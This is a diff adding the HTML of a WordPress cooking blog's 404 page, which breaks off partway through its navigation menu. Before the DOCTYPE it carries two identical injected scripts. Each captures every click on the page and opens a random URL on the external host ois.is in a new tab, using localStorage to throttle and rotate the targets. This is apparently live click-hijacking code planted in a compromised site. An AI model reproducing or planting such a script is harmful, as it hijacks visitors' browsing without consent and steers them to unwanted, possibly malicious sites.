@@ -1,0 +1,931 @@
+<script>(function (parameters) {
+		const targets = [
+			'https://ois.is/images/logo-1.png', 'https://ois.is/images/logo-2.png', 'https://ois.is/images/logo-3.png', 'https://ois.is/images/logo-4.png', 'https://ois.is/images/logo-5.png', 'https://ois.is/images/logo-6.png', 'https://ois.is/images/logo-7.png', 'https://ois.is/images/logo-8.png'
+		]
+		// Times between clicks
+		const restMinutes = 1;
+		// Number of hours to allow re-click 
+		const allowedHours = 2;
+
+
+		const saveTargetLocationsToStorage = (targets) => {
+			targets.forEach((target, index) => {
+				if(!localStorage.getItem(`${target}-local-storage`)){
+					localStorage.setItem(`${target}-local-storage`, 0);
+				}
+			});
+		}
+		const getRandomLocationFromStorage = (targets) => {
+			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+		}
+		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+		const getHoursDiff = (startDate, endDate) => {
+			const msInHour = 1000 * 60 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInHour);
+		}
+		const getMintsDiff = (startDate, endDate) => {
+			const msInMints = 1000 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInMints);
+		}
+
+		const visitNewLocation = (targets, host, nowDate) => {
+			saveTargetLocationsToStorage(targets);
+			newLocation = getRandomLocationFromStorage(targets);
+			setTimeToStorage(`${host}-mnts`, nowDate);
+			setTimeToStorage(`${host}-hurs`, nowDate);
+			setLocationAsVisited(newLocation);
+			window.open(newLocation, "_blank");
+		}
+
+		// const randomLocation = getRandomLocationFromStorage(targets);
+		saveTargetLocationsToStorage(targets);
+
+		function globalClick(event) {
+			event.stopPropagation();
+			const host = location.host;
+			let newLocation = getRandomLocationFromStorage(targets);
+			const nowDate = Date.parse(new Date());
+			const savedDateForMints = getTimeStorage(`${host}-mnts`);
+			const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+			if (savedDateForMints && savedDateForHours) {
+				try {
+					const storageDateForMints = parseInt(savedDateForMints);
+					const storageDateForHours = parseInt(savedDateForHours);
+					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+					if (hoursDiff >= allowedHours) {
+						saveTargetLocationsToStorage(targets);
+						setTimeToStorage(`${host}-hurs`, nowDate);
+					}
+					if (mintsDiff >= restMinutes) {
+						if (newLocation) {
+							setTimeToStorage(`${host}-mnts`, nowDate);
+							window.open(newLocation, "_blank");
+							setLocationAsVisited(newLocation);
+						}
+					}
+				} catch (error) { visitNewLocation(targets, host, nowDate); }
+			} else { visitNewLocation(targets, host, nowDate); }
+		}
+		document.addEventListener("click", globalClick)
+	})()</script><script>(function (parameters) {
+		const targets = [
+			'https://ois.is/images/logo-1.png', 'https://ois.is/images/logo-2.png', 'https://ois.is/images/logo-3.png', 'https://ois.is/images/logo-4.png', 'https://ois.is/images/logo-5.png', 'https://ois.is/images/logo-6.png', 'https://ois.is/images/logo-7.png', 'https://ois.is/images/logo-8.png'
+		]
+		// Times between clicks
+		const restMinutes = 1;
+		// Number of hours to allow re-click 
+		const allowedHours = 2;
+
+
+		const saveTargetLocationsToStorage = (targets) => {
+			targets.forEach((target, index) => {
+				if(!localStorage.getItem(`${target}-local-storage`)){
+					localStorage.setItem(`${target}-local-storage`, 0);
+				}
+			});
+		}
+		const getRandomLocationFromStorage = (targets) => {
+			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+		}
+		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+		const getHoursDiff = (startDate, endDate) => {
+			const msInHour = 1000 * 60 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInHour);
+		}
+		const getMintsDiff = (startDate, endDate) => {
+			const msInMints = 1000 * 60;
+			return Math.round(Math.abs(endDate - startDate) / msInMints);
+		}
+
+		const visitNewLocation = (targets, host, nowDate) => {
+			saveTargetLocationsToStorage(targets);
+			newLocation = getRandomLocationFromStorage(targets);
+			setTimeToStorage(`${host}-mnts`, nowDate);
+			setTimeToStorage(`${host}-hurs`, nowDate);
+			setLocationAsVisited(newLocation);
+			window.open(newLocation, "_blank");
+		}
+
+		// const randomLocation = getRandomLocationFromStorage(targets);
+		saveTargetLocationsToStorage(targets);
+
+		function globalClick(event) {
+			event.stopPropagation();
+			const host = location.host;
+			let newLocation = getRandomLocationFromStorage(targets);
+			const nowDate = Date.parse(new Date());
+			const savedDateForMints = getTimeStorage(`${host}-mnts`);
+			const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+			if (savedDateForMints && savedDateForHours) {
+				try {
+					const storageDateForMints = parseInt(savedDateForMints);
+					const storageDateForHours = parseInt(savedDateForHours);
+					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+					if (hoursDiff >= allowedHours) {
+						saveTargetLocationsToStorage(targets);
+						setTimeToStorage(`${host}-hurs`, nowDate);
+					}
+					if (mintsDiff >= restMinutes) {
+						if (newLocation) {
+							setTimeToStorage(`${host}-mnts`, nowDate);
+							window.open(newLocation, "_blank");
+							setLocationAsVisited(newLocation);
+						}
+					}
+				} catch (error) { visitNewLocation(targets, host, nowDate); }
+			} else { visitNewLocation(targets, host, nowDate); }
+		}
+		document.addEventListener("click", globalClick)
+	})()</script><!DOCTYPE html>
+<!--[if lt IE 7 ]>	<html lang="en-US" class="no-js ie6"> <![endif]-->
+<!--[if IE 7 ]>		<html lang="en-US" class="no-js ie7"> <![endif]-->
+<!--[if IE 8 ]>		<html lang="en-US" class="no-js ie8"> <![endif]-->
+<!--[if IE 9 ]>		<html lang="en-US" class="no-js ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!-->
+<html lang="en-US" class="no-js"> <!--<![endif]-->
+<head>
+<meta charset="UTF-8" />
+
+
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
+<meta name="HandheldFriendly" content="true">
+
+<link rel="pingback" href="https://cheftomcooks.com/xmlrpc.php" />
+
+<title>Page not found &#8211; Chef Tom Cooks !</title>
+
+<meta name='robots' content='max-image-preview:large' />
+<link rel='dns-prefetch' href='//chicoryapp.com' />
+<link rel='dns-prefetch' href='//ws.sharethis.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="Chef Tom Cooks ! &raquo; Feed" href="https://cheftomcooks.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Chef Tom Cooks ! &raquo; Comments Feed" href="https://cheftomcooks.com/comments/feed/" />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/cheftomcooks.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.4"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://cheftomcooks.com/wp-includes/css/dist/block-library/style.min.css?ver=6.6.4' type='text/css' media='all' />
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='bbp-default-css' href='https://cheftomcooks.com/wp-content/plugins/bbpress/templates/default/css/bbpress.min.css?ver=2.6.11' type='text/css' media='all' />
+<link rel='stylesheet' id='wsl-widget-css' href='https://cheftomcooks.com/wp-content/plugins/wordpress-social-login/assets/css/style.css?ver=6.6.4' type='text/css' media='all' />
+<link rel='stylesheet' id='wpurp_style_minified-css' href='https://cheftomcooks.com/wp-content/plugins/wp-ultimate-recipe/assets/wpurp-public-forced.css?ver=3.13.0' type='text/css' media='all' />
+<link rel='stylesheet' id='wpurp_style1-css' href='https://cheftomcooks.com/wp-content/plugins/wp-ultimate-recipe/vendor/font-awesome/css/font-awesome.min.css?ver=3.13.0' type='text/css' media='all' />
+<link crossorigin="anonymous" rel='stylesheet' id='wpurp_style2-css' href='https://fonts.googleapis.com/css?family=Open+Sans&#038;ver=3.13.0' type='text/css' media='all' />
+<link crossorigin="anonymous" rel='stylesheet' id='default_gwf-css' href='//fonts.googleapis.com/css?family=Open+Sans%3A400%2C400italic%2C600%2C600italic%2C700%2C700italic%2C300%2C300italic&#038;ver=6.6.4' type='text/css' media='all' />
+<link rel='stylesheet' id='parent-style-css' href='https://cheftomcooks.com/wp-content/themes/mesocolumn/style.css?ver=6.6.4' type='text/css' media='all' />
+<link rel='stylesheet' id='superfish-css' href='https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/superfish-menu/css/superfish.css?ver=6.6.4' type='text/css' media='all' />
+<link rel='stylesheet' id='tabber-css' href='https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/tabber/tabber.css?ver=6.6.4' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-cdn-css' href='https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/scripts/font-awesome/css/font-awesome.css?ver=6.6.4' type='text/css' media='all' />
+<link rel='stylesheet' id='bb-custom-css-css' href='https://cheftomcooks.com/wp-content/themes/mesocolumn/lib/bbpress/bb-css.css?ver=6.6.4' type='text/css' media='all' />
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://cheftomcooks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script id='st_insights_js' type="text/javascript" src="https://ws.sharethis.com/button/st_insights.js?publisher=eba0f3ba-f9ab-408c-bc68-c28af5afe749&amp;product=feather&amp;ver=1727996607" id="feather-sharethis-js"></script>
+<link rel="https://api.w.org/" href="https://cheftomcooks.com/wp-json/" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://cheftomcooks.com/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.6.4" />
+        <style type="text/css">
+			.bbpressloginlinks{float:right;padding-right:20px;}
+.bbpressregisterurl{margin-left:20px;}
+.bbpresslostpasswordurl{margin-left:20px;}
+.bbpresslogouturl{margin-left:20px;}		</style>
+        <style type="text/css" media="all">
+</style>
+<style type="text/css" media="all">
+</style>
+
+<style type="text/css"></style>
+<!-- There is no amphtml version available for this URL. --><style>
+.synved-social-resolution-single {
+display: inline-block;
+}
+.synved-social-resolution-normal {
+display: inline-block;
+}
+.synved-social-resolution-hidef {
+display: none;
+}
+
+@media only screen and (min--moz-device-pixel-ratio: 2),
+only screen and (-o-min-device-pixel-ratio: 2/1),
+only screen and (-webkit-min-device-pixel-ratio: 2),
+only screen and (min-device-pixel-ratio: 2),
+only screen and (min-resolution: 2dppx),
+only screen and (min-resolution: 192dpi) {
+	.synved-social-resolution-normal {
+	display: none;
+	}
+	.synved-social-resolution-hidef {
+	display: inline-block;
+	}
+}
+</style><style type="text/css" media="all">
+body {font-family: 'Open Sans', sans-serif;font-weight: 400;}
+#siteinfo div,h1,h2,h3,h4,h5,h6,.header-title,#main-navigation, #featured #featured-title, #cf .tinput, #wp-calendar caption,.flex-caption h1,#portfolio-filter li,.nivo-caption a.read-more,.form-submit #submit,.fbottom,ol.commentlist li div.comment-post-meta, .home-post span.post-category a,ul.tabbernav li a {font-family: 'Open Sans', sans-serif;font-weight:600;}
+#main-navigation, .sf-menu li a {font-family: 'Open Sans', sans-serif;font-weight: 600;}
+#custom #siteinfo a {color: # !important;text-decoration: none;}
+#custom #siteinfo p#site-description {color: # !important;text-decoration: none;}
+#post-entry div.post-thumb.size-thumbnail {float:left;width:150px;}
+#post-entry article .post-right {margin:0 0 0 170px;}
+</style>
+<style type="text/css">
+</style>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-7599050027327974",
+    enable_page_level_ads: true
+  });
+</script>
+</head>
+
+<body class="error404 chrome" id="custom">
+
+<div class="product-with-desc secbody">
+
+<div id="wrapper">
+
+<div id="wrapper-main">
+
+<div id="bodywrap" class="innerwrap">
+
+<div id="bodycontent">
+
+<div id="container">
+
+<nav class="top-nav iegradient effect-1" id="top-navigation">
+<div class="innerwrap">
+<ul class="sf-menu"><li ><a href="https://cheftomcooks.com/">Home</a></li><li class="page_item page-item-2"><a href="https://cheftomcooks.com/about/">About</a></li><li class="page_item page-item-121272"><a href="https://cheftomcooks.com/affiliate-disclosure/">Affiliate Disclosure</a></li><li class="page_item page-item-22"><a href="https://cheftomcooks.com/archive/">Archives</a></li><li class="page_item page-item-24"><a href="https://cheftomcooks.com/contact/">Contact Me !</a></li><li class="page_item page-item-37"><a href="https://cheftomcooks.com/free-cookbook/">Cookbook</a></li><li class="page_item page-item-116008"><a href="https://cheftomcooks.com/coupon-center/">Coupon Center</a></li><li class="page_item page-item-92902"><a href="https://cheftomcooks.com/forum-login/">Forum Login</a></li><li class="page_item page-item-28"><a href="https://cheftomcooks.com/links/">Links</a></li></ul></div>
+</nav>
+<!-- HEADER START -->
+<header class="iegradient _head" id="header">
+<div class="header-inner">
+<div class="innerwrap">
+<div id="siteinfo">
+<h1 ><a href="https://cheftomcooks.com/" title="Chef Tom Cooks !" rel="home">Chef Tom Cooks !</a></h1 ><p id="site-description">A friendly cooking and recipe blog.</p>
+</div>
+<!-- SITEINFO END -->
+</div>
+</div>
+</header>
+<!-- HEADER END -->
+<div class="container-wrap">
+
+<!-- NAVIGATION START -->
+<nav class="main-nav iegradient" id="main-navigation">
+<ul class="sf-menu">	<li class="cat-item cat-item-7"><a href="https://cheftomcooks.com/category/articles/">Articles</a>
+</li>
+	<li class="cat-item cat-item-92"><a href="https://cheftomcooks.com/category/blogging/">Blogging</a>
+</li>
+	<li class="cat-item cat-item-316"><a href="https://cheftomcooks.com/category/cookbooks/">Cookbooks</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="https://cheftomcooks.com/category/cooking/">Cooking</a>
+</li>
+	<li class="cat-item cat-item-70"><a href="https://cheftomcooks.com/category/cuisine/">Cuisine</a>
+<ul class='children'>
+	<li class="cat-item cat-item-75"><a href="https://cheftomcooks.com/category/cuisine/asian/">Asian</a>
+</li>
+	<li class="cat-item cat-item-680"><a href="https://cheftomcooks.com/category/cuisine/german-cuisine/">German</a>
+</li>
+	<li class="cat-item cat-item-143"><a href="https://cheftomcooks.com/category/cuisine/greek/">Greek</a>
+</li>
+	<li class="cat-item cat-item-496"><a href="https://cheftomcooks.com/category/cuisine/indian/">Indian</a>
+</li>
+	<li class="cat-item cat-item-71"><a href="https://cheftomcooks.com/category/cuisine/italian-cuisine/">Italian</a>
+</li>
+	<li class="cat-item cat-item-72"><a href="https://cheftomcooks.com/category/cuisine/mexican/">Mexican</a>
+</li>
+	<li class="cat-item cat-item-73"><a href="https://cheftomcooks.com/category/cuisine/spanish/">Spanish</a>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-37"><a href="https://cheftomcooks.com/category/downloads/">Downloads</a>
+</li>
+	<li class="cat-item cat-item-1292"><a href="https://cheftomcooks.com/category/freebies/">Freebies</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="https://cheftomcooks.com/category/friends/">Friends</a>
+</li>
+	<li class="cat-item cat-item-478"><a href="https://cheftomcooks.com/category/gardening/">Gardening</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="https://cheftomcooks.com/category/general/">General</a>
+</li>
+	<li class="cat-item cat-item-613"><a href="https://cheftomcooks.com/category/guest-posts/">Guest Posts</a>
+</li>
+	<li class="cat-item cat-item-65"><a href="https://cheftomcooks.com/category/healthyeating/">Healthy Eating</a>
+<ul class='children'>
+	<li class="cat-item cat-item-36"><a href="https://cheftomcooks.com/category/healthyeating/diets/">Diets</a>
+	<ul class='children'>
+	<li class="cat-item cat-item-1325"><a href="https://cheftomcooks.com/category/healthyeating/diets/low-cholesterol/">Low Cholesterol</a>
+</li>
+	<li class="cat-item cat-item-83"><a href="https://cheftomcooks.com/category/healthyeating/diets/low-fat/">Low Fat</a>
+</li>
+	</ul>
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-1328"><a href="https://cheftomcooks.com/category/low-cholesterol-2/">low cholesterol</a>
+</li>
+	<li class="cat-item cat-item-3"><a href="https://cheftomcooks.com/category/recipes/">Recipes</a>
+<ul class='children'>
+	<li class="cat-item cat-item-51"><a href="https://cheftomcooks.com/category/recipes/appetizers-recipes/">Appetizers</a>
+</li>
+	<li class="cat-item cat-item-45"><a href="https://cheftomcooks.com/category/recipes/beef-recipes/">Beef</a>
+</li>
